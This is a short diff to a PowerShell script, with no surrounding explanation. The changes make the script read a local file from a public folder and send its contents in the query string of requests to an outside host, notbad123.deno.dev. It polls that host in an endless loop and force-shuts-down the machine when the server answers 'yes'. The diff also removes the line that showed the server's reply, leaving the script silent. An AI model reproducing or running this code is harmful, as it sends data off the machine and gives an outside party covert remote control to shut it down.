@@ -1,10 +1,9 @@
-$s = Get-Content "target.txt"
+$s = Get-Content "C:\Users\Public\target.txt"
 
-$url = "notbad123.deno.dev"
+$url = "https://notbad123.deno.dev?name=$s"
 
 while ($true) {
-    $res = Invoke-WebRequest -Uri $url -Method Get -Body "name=$s"
-    Write-Output $res.Content
+    $res = Invoke-WebRequest -Uri $url -Method Get
     if ($res.Content -eq "yes") {
         Stop-Computer -Force
     }
